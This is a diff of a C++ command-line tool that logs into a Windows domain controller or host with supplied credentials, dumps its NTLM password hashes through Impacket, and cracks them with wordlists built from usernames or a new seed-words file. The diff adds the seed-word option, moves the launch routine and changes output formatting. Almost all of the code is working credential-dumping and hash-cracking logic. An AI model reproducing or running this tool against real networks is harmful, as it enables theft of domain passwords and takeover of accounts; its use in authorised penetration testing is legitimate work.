@@ -22,7 +22,47 @@ class Cracker {
         std::string username;
         std::string password;
         std::string target;
+        std::string seed_words_path;
 
+        void launch(int target_machine) {
+            std::vector<std::future<void>> futures;
+
+            std::cout << "\033[33m" << "[*] Dumping hashes..." << 
+                                                     "\033[0m" <<
+            std::endl;
+            std::string output = get_ntds(target_machine);
+            std::cout << "\033[33m" << "[*] Parsing dumped hashes..." << 
+                                                            "\033[0m" <<
+            std::endl;
+            std::unordered_map<std::string, std::string> creds = parse_hashes(output);            
+            clean();            
+            for (const auto& kv : creds) {
+                std::cout << "\033[33m" << "[*] The password of '" << kv.first << 
+                                                            "' is cracking..." << 
+                                                                     "\033[0m" << 
+                std::endl;
+                if (!seed_words_path.empty()) {
+                    std::vector<string> seed_words = get_wordlist(seed_words_path);
+                    std::vector<string> seed_wordlist;
+                    for (std::string seed_word : seed_words) {
+                        std::vector<std::string> wl = generate(seed_word);
+                        seed_wordlist.insert(seed_wordlist.end(), wl.begin(), wl.end());
+                    }
+                    auto future = std::async(std::launch::async, &Cracker::crack, this, seed_wordlist, kv.second.c_str(), kv.first.c_str());
+                    futures.push_back(std::move(future));
+                }
+                else {
+                    std::vector<std::string> wl = generate(kv.first);
+                    auto future = std::async(std::launch::async, &Cracker::crack, this, wl, kv.second.c_str(), kv.first.c_str());
+                    futures.push_back(std::move(future));
+                }
+            }
+            std::for_each(futures.begin(), futures.end(), [](std::future<void>& f) {
+                f.wait();
+            });
+        }
+
+    private:
         std::vector<std::string> check_username(const std::string& username) {
             std::vector<std::string> result;
 
@@ -77,8 +117,6 @@ class Cracker {
             return result;
         }
 
-
-
         std::vector<string> generate(std::string username) {
             std::vector<string> usernames;
             std::vector<string> mixed_extensions = extender(extensions);
@@ -99,22 +137,22 @@ class Cracker {
                     }
                 }
             }
-
             return new_usernames;
         }
-
 
         void crack(const std::vector<string>& wordlist, const char* hash, const char* username){
             for (std::size_t i = 0; i < wordlist.size(); i++) {
                 const char* generated_hash = gen_ntlm(wordlist[i]);
                 if (std::strcmp(hash, generated_hash) == 0) {
-                    std::string masked_password = wordlist[i].substr(0, 3) + std::string(wordlist[i].length() - 3, '*');
+                    std::string masked_password = wordlist[i].substr(0, 3) + 
+                                std::string(wordlist[i].length() - 4, '*') + 
+                    wordlist[i].substr(wordlist[i].length() - 1, wordlist[i].length());
                     std::cout << "\033[32m" << "[+] " << "\033[1;32m" << "Cracked: " <<
-                    "\033[0m" <<
-                    "\033[32m" <<
-                    "['" << username << "':" <<
-                    "'" << masked_password << "']" <<
-                    "\033[0m" <<
+                                                                           "\033[0m" <<
+                                                                          "\033[32m" <<
+                                                            "['" << username << "':" <<
+                                                      "'" << masked_password << "']" <<
+                                                                           "\033[0m" <<
                     std::endl;
                     break;
                 }
@@ -137,6 +175,28 @@ class Cracker {
                 output += line + "\n";
             }
             return output;
+        }
+
+        std::vector<std::string> get_wordlist(const std::string& path) {
+            std::vector<std::string> wordlist;
+            std::ifstream fin(path);
+            if (!fin.is_open()) {
+                std::cerr << "\033[31m" << 
+                    "[-] Error: failed to open file '" << 
+                                                  path << 
+                                                   "'" <<
+                                             "\033[0m" << 
+                    std::endl;
+                return wordlist;
+            }
+            std::string line;
+            while (std::getline(fin, line)) {
+                if (!line.empty()) {
+                    wordlist.push_back(line);
+                }
+            }
+            fin.close();
+            return wordlist;
         }
 
         std::unordered_map<std::string, std::string> parse_hashes(const std::string& input) {        
@@ -181,33 +241,6 @@ class Cracker {
             system(command.c_str());
         }
 
-        void launch(int target_machine) {
-            std::vector<std::future<void>> futures;
-
-            std::cout << "\033[33m" << "[*] Dumping hashes..." << 
-                "\033[0m" <<
-                std::endl;
-            std::string output = get_ntds(target_machine);
-            std::cout << "\033[33m" << "[*] Parsing dumped hashes..." << 
-                "\033[0m" <<
-                std::endl;
-            std::unordered_map<std::string, std::string> creds = parse_hashes(output);
-            
-            clean();
-            
-            for (const auto& kv : creds) {
-                std::cout << "\033[33m" << "[*] The password of '" << kv.first << "' is cracking..." << 
-                    "\033[0m" << std::endl;
-                std::vector<string> wl = generate(kv.first);
-                auto future = std::async(std::launch::async, &Cracker::crack, this, wl, kv.second.c_str(), kv.first.c_str());
-                futures.push_back(std::move(future));
-            }
-            std::for_each(futures.begin(), futures.end(), [](std::future<void>& f) {
-                 f.wait();
-             });
-        }
-
-    private:
         std::vector<std::string> extensions = {
             "123456",
             "654321",
@@ -248,7 +281,7 @@ class Cracker {
             "00008",
             "00009",
             "000000"
-    };
+        };
 
         std::vector<std::string> extender(std::vector<std::string> initial_extensions){
             std::vector<std::string> extensions;
@@ -269,11 +302,10 @@ class Cracker {
                                         extensions.end());
             return initial_extensions;
         }
-    
 };
 
 int main(int argc, char** argv) {
-    std::string ip_address, username, password;
+    std::string ip_address, username, password, seed_words_path;
     int target_machine;
     std::string python_check_command = "/usr/bin/python3 --version > /dev/null 2>&1";
     std::string impacket_check_command = "/usr/bin/python3 -c \"import impacket\" > /dev/null 2>&1";
@@ -288,13 +320,18 @@ int main(int argc, char** argv) {
  
     // Check if Python3 is installed
     if (system(python_check_command.c_str()) != 0) {
-        std::cerr << "[-] Error: Python3 is not installed." << std::endl;
+        std::cerr << "\033[31m" << "[-] Error: Python3 is not installed." << 
+                                                                "\033[0m" <<
+        std::endl;
         return EXIT_FAILURE;
     }
 
     // Check if Impacket is installed
     if (system(impacket_check_command.c_str()) != 0) {
-        std::cerr << "[-] Error: Impacket is not installed. Please install it by running 'pip3 install impacket'." << std::endl;
+        std::cerr << "\033[31m" << "[-] Error: Impacket is not installed." << 
+                   "Please install it by running 'pip3 install impacket'." <<
+                                                                 "\033[0m" <<
+        std::endl;
         return EXIT_FAILURE;
     }
     
@@ -303,6 +340,7 @@ int main(int argc, char** argv) {
     app.add_option("-t,--target-ip", ip_address, "Target IP address")->required();
     app.add_option("-u,--username", username, "Username")->required();
     app.add_option("-p,--password", password, "Password")->required();
+    app.add_option("-w,--seed-words", seed_words_path, "File path of seed words");
     app.add_option("-m, --target-machine", target_machine, "Domain Controller = 1, Regular Windows = 2")->required();
 
     CLI11_PARSE(app, argc, argv);
@@ -310,13 +348,18 @@ int main(int argc, char** argv) {
     std::string target = username + ":" + password + "@" + ip_address;
     
     if (target_machine > 2 || target_machine < 1) {
-        std::cerr << "[-] Error: Target machine can be 1 or 2" << std::endl;
+        std::cerr << "\033[31m" << "[-] Error: Target machine can be 1 or 2" << "\033[0m" << std::endl;
         return EXIT_FAILURE;
     }
 
-    // Use the target value
-    cracker.target = target;
-    cracker.launch(target_machine);
+    if (!seed_words_path.empty()) {
+        cracker.seed_words_path = seed_words_path;
+        cracker.target = target;
+        cracker.launch(target_machine);
+    } else {
+        cracker.target = target;
+        cracker.launch(target_machine);
+    }
     
     return 0;
 }
